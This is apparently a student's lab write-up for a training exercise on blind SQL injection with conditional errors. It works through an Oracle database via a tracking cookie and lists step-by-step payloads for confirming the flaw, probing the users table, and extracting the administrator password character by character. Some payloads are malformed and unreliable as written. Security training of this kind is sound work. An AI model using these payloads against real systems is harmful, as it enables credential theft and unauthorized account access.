Lab #12 - Blind SQL injection with conditional errors

Vulnerable parameter - tracking cookie

End Goals:
	- Output the administrator password
	- Login as the administrator user


Analysis: 

1) Prove that param is vulnerable

' || (select '') ||' --> gives error
2) confirm users table exist
' || (select '' from dual) || ' --> its oracle db doesn;t gives error
 ' || (select '' from users where rownum =1) || '
 -> users table exists

3) administrator user exist
' || (select '' from users where username ='administrator') || '

case expression in orcacle

' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) ||'
' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') ||'

4) Determine the length of password
' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) ||'

5) Output the administrator password

' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') and substr(password,,1)='a' ||'